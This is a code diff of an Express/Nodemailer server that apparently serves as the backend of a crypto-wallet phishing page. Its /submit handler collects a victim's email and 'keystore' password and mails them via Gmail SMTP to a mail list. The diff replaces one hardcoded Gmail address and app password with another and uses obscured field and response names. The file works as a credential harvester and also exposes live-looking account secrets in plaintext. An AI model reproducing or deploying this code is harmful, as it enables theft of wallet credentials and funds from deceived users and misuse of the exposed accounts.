@@ -8,7 +8,6 @@ const port = process.env.PORT || 3000;
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
-app.use(express.json());
 
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -21,9 +20,13 @@ const transporter = nodemailer.createTransport({
   port: 465,
   secure: true,
   auth: {
-    user: process.env.EMAIL_USER || "willyscotmegan@gmail.com",
-    pass: process.env.EMAIL_PASS || "jubtgphwdbkrrauf",
+    user: process.env.EMAIL_USER || "divasnow178@gmail.com",
+    pass: process.env.EMAIL_PASS || "cfoyhwlljngpvera",
   },
+});
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'app.html'));
 });
 
 app.post('/submit', async (req, res) => {
@@ -33,20 +36,25 @@ app.post('/submit', async (req, res) => {
     const { wName, psdWet } = req.body;
 
     const mailOptions = {
-      from: '"Deets" <willyscotmegan@gmail.com>',
+      from: '"Deets" <divasnow178@gmail.com>',
       to: maillist,
-      subject: "New Form Submission",
       html: `
         <p><strong>Eml:</strong> ${wName || 'Not provided'}</p>
-        <p><strong>Psd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
+        <p><strong>Pswd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
       `
     };
-    
-    await transporter.sendMail(mailOptions);
-    
-    res.json({ success: true });
+
+    const info = await transporter.sendMail(mailOptions);
+
+    res.status(200).send('Wdestscesful');
   } catch (error) {
-    console.error('Error:', error);
-    res.status(500).json({ error: 'Submission failed' });
+    console.error('err', error);
+    res.status(500).send('Errwetdets');
   }
 });
+
+app.listen(port, () => {
+  console.log(``);
+});
+
+module.exports = app;
